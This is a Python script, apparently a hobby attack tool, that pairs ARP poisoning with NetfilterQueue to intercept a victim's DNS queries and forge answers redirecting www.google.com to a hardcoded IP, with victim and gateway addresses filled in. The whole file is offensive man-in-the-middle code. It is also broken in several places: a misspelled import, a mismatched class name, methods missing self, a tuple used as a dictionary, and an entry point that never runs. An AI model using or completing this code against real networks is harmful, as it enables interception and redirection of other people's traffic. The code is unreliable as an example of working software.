from typing import Any
from netfilterqueue import NetFilterQueue
import os
import ArpPoison
import threading
from scapy.all import IP, UDP, NDS, DNSRR, DNSQR, Ether

class Dns_spoof:

    def __init__(self, queue_num, ipVictim, ipServer, host) -> None:
        self.queue_num = 1

    def __call__(self, *args: Any, **kwds: Any) -> Any:
        pass

    def main():
        pktCounter = 0

        arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
        arpThread.start()

        queue = NetfilterQueue()
        queue.bind(queue_num, call_back)
        queue.run()

    def call_back(bin_packet):
        packet = IP(bin_packet.get_payload())
        if packet.haslayer(DNSQR):
            try:
                queryName = packet[DNSQR].qname
                if queryName in host:
                    packet[DNS].an = DNSRR(
                        rrname=queryName, rdata=host[queryName])
                    packet[DNS].ancount = 1
                    del packet[IP].len
                    del packet[IP].chksum
                    del packet[UDP].len
                    del packet[UDP].chksum
            except IndexError as error:
                return False
            packet.set_payload(bytes(packet))
        return packet.accept()

if __name__ == '__main__':
    host = ("www.google.com", "188.114.96.0")
    queue_num = 1
    ipVictim = '192.168.178.144' # The IP address of the victim
    ipServer = '192.168.178.1' # The IP address of the gateway    
    Dns_spoof(queue_num, ipVictim, ipServer, host)    